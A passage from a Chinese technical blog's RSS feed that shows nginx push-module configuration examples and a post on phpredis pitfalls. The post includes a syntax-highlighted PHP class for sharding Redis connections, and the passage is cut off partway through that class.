    set $push_channel_id $arg_id;
    default_type application/json;
}

location ~ ^/activity_jsonp$ {
    push_subscriber;
    push_subscriber_timeout 60s;
    push_subscriber_concurrency first;
    push_max_channel_subscribers 1;
    set $push_channel_id $arg_id;
    default_type application/json;
    echo_before_body $arg_callback "(";
    echo_after_body ")";
}
</pre>
</div>
</div>

<div id="outline-container-org402594a" class="outline-2">
<h2 id="org402594a"><a href="https://github.com/wandenberg/nginx-push-stream-module">nginx-push-stream-module</a> （建议使用）</h2>
<div class="outline-text-2" id="text-org402594a">
<p>
由于 <a href="https://github.com/slact/nginx_http_push_module">nginx_http_push_module</a> 存在内存泄露问题，同时没有人进行正式的修复，我们决定尝试一下<a href="https://github.com/wandenberg/nginx-push-stream-module">nginx-push-stream-module</a>，这个模块功能更强大同时文档更完整，看起来也更活跃。
</p>

<dl class="org-dl">
<dt>优点</dt><dd><ul class="org-ul">
<li>更成熟
有内存消耗说明文档，便于决定共享内存容量配置。
有统计功能。
可对响应内容进行再处理。</li>
<li>测试中未发现明显的内存泄露</li>
<li>内置支持jsonp
返回的jsonp是这样的格式callback([text])，可以通过修改ngx_http_push_stream_module_utils.h中定义的NGX_HTTP_PUSH_STREAM_CALLBACK_INIT_CHUNK和NGX_HTTP_PUSH_STREAM_CALLBACK_END_CHUNK去除多余的中括号。</li>
</ul></dd>
</dl>
<dl class="org-dl">
<dt>参考配置</dt><dd></dd>
</dl>
<pre class="example">
push_stream_store_messages off;
push_stream_max_subscribers_per_channel 1;
push_stream_subscriber_connection_ttl 60s;
push_stream_longpolling_connection_ttl 60s;

server {
    listen 80;
    server_name localhost 127.0.0.1;
    
    ...

    location ~ ^/publish$ {
        allow 127.0.0.1;
        deny all;
        push_stream_publisher admin;
        set $push_stream_channel_id $arg_id;
    }
    
    location ~ ^/activity$ {
        push_stream_subscriber long-polling;
        set $push_stream_channels_path $arg_id;
        push_stream_content_type "application/json";
        push_stream_message_template "~text~";
    }

    ...
}

</pre>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[当php遇上redis]]></title>
            <link>/article/5f53-php-90474e0a-redis.html</link>
            <guid>/article/5f53-php-90474e0a-redis.html</guid>
            <pubDate>Sat, 08 Dec 2012 05:41:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在最近的项目中，我们需要在php中访问redis，我们选择了使用<a href="https://github.com/nicolasff/phpredis">phpredis</a>库，下面是遇到的一些问题。
</p>

<div id="outline-container-org52b0e2c" class="outline-2">
<h2 id="org52b0e2c">redis持久连接不靠谱。</h2>
<div class="outline-text-2" id="text-org52b0e2c">
<p>
可以说这是php的通病了，不管是mysql、memcache还是redis，指望由php本身（包含php扩展）来实现持久连接都是行不通的。
</p>

<dl class="org-dl">
<dt>为什么这么说呢？</dt><dd><p>
     首先，所谓的持久连接的实现不外乎在进程（php-fpm）内建一个连接池，当php需要连接时，先以ip+port等信息为key在池中查找，找到则直接返回已有连接没有则新建连接。而当一个请求执行结束时，不关闭连接，而是把连接归还到池中。
</p>

<p>
这样当php需要用到多个redis实例时（分库），因为一个php-fpm进程会持有每个redis实例的一个连接，所以需要“php-fpm进程数“*“redis实例数"个redis连接，而对于每个redis服务器则有“php-fpm进程数“个客户端连接。
</p>

<p>
举个例子：一个web应用开了1000个php-fpm进程，有10个redis实例，那么保持的redis连接数就为1000*10也就是10000，每个redis实例有1000个客户端连接。如果前端或redis再扩容所需要的连接就会以乘积方式增加。一个redis实例有php-fpm进程数个连接的情况下表现如何呢，这就要好好测一测了，反正是每连接一线程的mysql是直接堵死了。
</p></dd>
</dl>
</div>
</div>

<div id="outline-container-org5be4ad3" class="outline-2">
<h2 id="org5be4ad3">RedisArray不靠谱。</h2>
<div class="outline-text-2" id="text-org5be4ad3">
<p>
RedisArray实现了一致性hash分布式，但是它在初始化的时候就会连接上每个实例，这在web应用中简直是胡闹，它对一致性hash实现得比较完善，结点失效、动态添加结点时重新hash都有处理，在万不得已进行水平扩容时，可能会用得上。
</p>
</div>
</div>

<div id="outline-container-org1e8d179" class="outline-2">
<h2 id="org1e8d179">需要自已关闭redis连接。</h2>
<div class="outline-text-2" id="text-org1e8d179">
<p>
Redis的析构函数没有关闭redis连接，这会导致redis网络负载过高，要确保脚本结束时关闭连接，最好是能够封装一下Redis类再使用。
</p>

<dl class="org-dl">
<dt>示例封装</dt><dd></dd>
</dl>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#20998;&#24067;&#24335;Redis.</span>
<span style="color: #b5bd68;">class</span> <span style="color: #81a2be;">RedisShard</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#26500;&#36896;&#20989;&#25968;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">__construct</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shards</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">reinit</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shards</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#26512;&#26500;&#20989;&#25968;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#33050;&#26412;&#32467;&#26463;&#26102;&#65292;phpredis&#19981;&#20250;&#33258;&#21160;&#20851;&#38381;redis&#36830;&#25509;&#65292;&#36825;&#37324;&#28155;&#21152;&#33258;&#21160;&#20851;&#38381;&#36830;&#25509;&#25903;&#25345;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#21487;&#20197;&#36890;&#36807;&#25163;&#21160;unset&#26412;&#31867;&#23545;&#35937;&#24555;&#36895;&#37322;&#25918;&#36164;&#28304;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">__destruct</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>)){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#37325;&#26032;&#21021;&#22987;&#21270;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">reinit</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shards</span>){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">index</span> = 0;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shards</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shards</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shards</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">index</span>] = explode(<span style="color: #8abeb7;">':'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>); <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26684;&#24335;&#65306;host:port:db</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shards</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">index</span>][<span style="color: #8abeb7;">'index'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">index</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ++<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">index</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }<span style="color: #373b41; background-color: #de935f;">        </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#36716;&#21457;&#26041;&#27861;&#35843;&#29992;&#21040;&#30495;&#27491;&#30340;redis&#23545;&#35937;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">__call</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arguments</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = call_user_func_array(<span style="color: #b5bd68;">array</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">redis</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arguments</span>[0]), <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>)<span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">arguments</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> === <span style="color: #81a2be;">false</span> <span style="color: #b5bd68;">and</span> in_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>, <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'set'</span>, <span style="color: #8abeb7;">'setex'</span>, <span style="color: #8abeb7;">'incr'</span>)))<span style="text-decoration: underline;"> {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   trigger_error(<span style="color: #8abeb7;">"redis error: "</span> . <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[0] . <span style="color: #8abeb7;">':'</span> . <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span><span style="text-decoration: underline;">[1] . </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> .</span><span style="color: #81a2be; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[2] . </span><span style="color: #8abeb7; text-decoration: underline;">" </span><span style="color: #f0c674; text-decoration: underline;">$name</span><span style="color: #8abeb7; text-decoration: underline;"> "</span><span style="text-decoration: underline;"> . implode(</span><span style="color: #8abeb7; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">arguments</span><span style="text-decoration: underline;">), </span><span style="color: #81a2be; text-decoration: underline;">E_USER_NOTICE</span><span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;1&#33267;max&#38388;&#30340;&#21807;&#19968;&#24207;&#21495;name&#65292;&#36798;&#21040;max&#21518;&#20250;&#20174;1&#24320;&#22987;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">redis&#30340;&#36882;&#22686;&#21040;&#26368;&#22823;&#20540;&#21518;&#20250;&#36820;&#22238;&#38169;&#35823;&#65292;&#26412;&#26041;&#27861;&#23454;&#29616;&#23433;&#20840;&#30340;&#36882;&#22686;&#12290;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#22833;&#36133;&#36820;&#22238;false&#65292;&#26368;&#35201;&#30830;&#20445;&#24050;&#29992;redis()&#26041;&#27861;&#36830;&#21040;&#29983;&#25104;&#24207;&#21495;&#30340;&#26576;&#20010;redis&#23545;&#35937;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">id</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>)){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">id</span> = <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">incr</span>(<span style="color: #8abeb7;">'_id_'</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">id</span>){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span> = intval(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span>/count(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shards</span>));
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">id</span> % <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span> == 0){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">decrBy</span>(<span style="color: #8abeb7;">'_id_'</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span>) &gt;=<span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">max</span><span style="text-decoration: underline;">){</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">id</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">id</span> &gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span>){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">id</span> %= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">max</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">id</span> - 1)*count(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shards</span>) + (<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'index'</span>] +<span style="text-decoration: underline;"> 1);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">&#36830;&#25509;&#24182;&#36820;&#22238;key&#23545;&#24212;&#30340;redis&#23545;&#35937;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">public</span> <span style="color: #b5bd68;">function</span> <span style="color: #de935f;">redis</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #ff0000; background-color: #ffffff; font-weight: bold;">TODO</span><span style="color: #969896; font-style: italic;">: crc32&#22312;32&#20301;&#31995;&#32479;&#19979;&#20250;&#36820;&#22238;&#36127;&#25968;&#65292;&#22240;&#25105;&#20204;&#26159;&#37096;&#32626;&#22312;64&#20301;&#31995;&#32479;&#19978;&#65292;&#26242;&#26102;&#24573;&#30053;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   assert(<span style="color: #81a2be;">PHP_INT_SIZE</span> === 8);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">index</span> = crc32(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>) % count(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shards</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span> = <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shards</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">index</span>];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>)){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#23581;&#35797;&#37325;&#29992;&#24050;&#26377;&#36830;&#25509;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[0] == <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[0] <span style="color: #b5bd68;">and</span> <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[1] == <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[1]){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[2] != <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[2]){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span> <span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">shard</span>[<span style="color: #8abeb7;">'redis'</span>]<span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">select</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[2])){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   trigger_error(<span style="color: #8abeb7;">'redis error: select '</span> . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">shard</span>[0] . <span style="color: #8abeb7;">':'</span> .<span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[1] . </span><span style="color: #8abeb7; text-decoration: underline;">':'</span><span style="text-decoration: underline;"> .</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">shard</span><span style="text-decoration: underline;">[2], </span><span style="color: #81a2be; text-decoration: underline;">E_USER_ERROR</span><span style="text-decoration: underline;">);</span>
